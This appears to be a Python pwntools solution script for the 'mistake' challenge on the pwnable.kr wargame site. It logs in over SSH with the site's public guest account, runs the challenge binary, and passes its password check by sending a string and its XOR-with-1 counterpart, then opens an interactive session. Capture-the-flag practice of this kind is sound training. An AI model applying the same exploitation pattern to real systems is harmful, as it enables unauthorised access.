from pwn import *

context.log_level = 'debug'

conn = ssh(host='pwnable.kr', port=2222, user='mistake', password='guest')
p = conn.process('mistake')

buf_1 = "B"*10
buf_2 = chr(ord('B') ^ 1) * 10

p.recvuntil(b"do not bruteforce...\n")
p.send(buf_1.encode())
p.recvuntil(b"password : ")
p.sendline(buf_2.encode())

p.interactive()
